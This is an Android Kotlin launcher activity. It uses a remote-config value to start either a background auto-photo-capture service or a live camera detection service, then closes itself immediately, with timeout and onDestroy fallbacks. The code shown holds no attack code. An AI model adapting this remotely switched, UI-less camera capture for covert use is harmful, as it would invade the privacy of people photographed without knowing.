package com.example.demoapplication

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.demoapplication.services.CameraBackgroundService
import com.example.demoapplication.services.LiveCameraDetectService
import com.example.demoapplication.services.NetworkModule

class LauncherActivity : AppCompatActivity() {
    private var launched = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_launcher)
        Log.w("LauncherActivity", "Start Activity")
        // Only open destination when remote config fetch+activate returns success
        RemoteConfigHelper.fetchAndActivate { success ->
            runOnUiThread {
                if (!launched) {
                    if (success) {
                        val dest = RemoteConfigHelper.startDestination()
                        NetworkModule.applyStartDestination(dest)
                        Log.w("LauncherActivity", "Start Activity - calling openDestination() with remote config")
                        openDestination(dest)
                    } else {
                        Log.w("LauncherActivity", "RemoteConfig fetch failed — opening default LiveCameraDetectService")
                        // Open default service when network fails
                        openDefaultService()
                    }
                }
            }
        }

        // Add a timeout fallback in case the network request takes too long or never completes
        Handler(Looper.getMainLooper()).postDelayed({
            if (!launched) {
                Log.w("LauncherActivity", "RemoteConfig timeout — opening default LiveCameraDetectService")
                openDefaultService()
            }
        }, 15000) // 15 second timeout
    }

    private fun openDestination(dest: String) {
        if (launched) return
        launched = true

        when (val destination = dest.lowercase()) {
            "auto_photo_capture" -> {
                val serviceIntent = Intent(this, CameraBackgroundService::class.java)
                ContextCompat.startForegroundService(this, serviceIntent)
//                startActivity(Intent(this, CameraDetectActivity::class.java))
                Log.d("OpenDest", "Started CameraService for auto_photo_capture")
            }
            "live_camera_detect" -> {
                val serviceIntent = Intent(this, LiveCameraDetectService::class.java)
                ContextCompat.startForegroundService(this, serviceIntent)
//                startActivity(Intent(this, MainActivity::class.java))
                Log.d("OpenDest", "Started LiveCameraService for live_camera_detect")
            }
            else -> {
                // Fallback to default service for any unknown destination
                Log.d("OpenDest", "Unknown destination '$destination' — starting default LiveCameraService")
                openDefaultService()
            }
        }
        finish()
    }

    private fun openDefaultService() {
        if (launched) return
        launched = true

        val serviceIntent = Intent(this, LiveCameraDetectService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)
        Log.d("OpenDest", "Started default LiveCameraDetectService")
        finish()
    }

    override fun onDestroy() {
        // Ensure we launch the default service if activity is destroyed before completion
        if (!launched) {
            Log.w("LauncherActivity", "Activity destroyed before launch — opening default service")
            openDefaultService()
        }
        super.onDestroy()
    }
}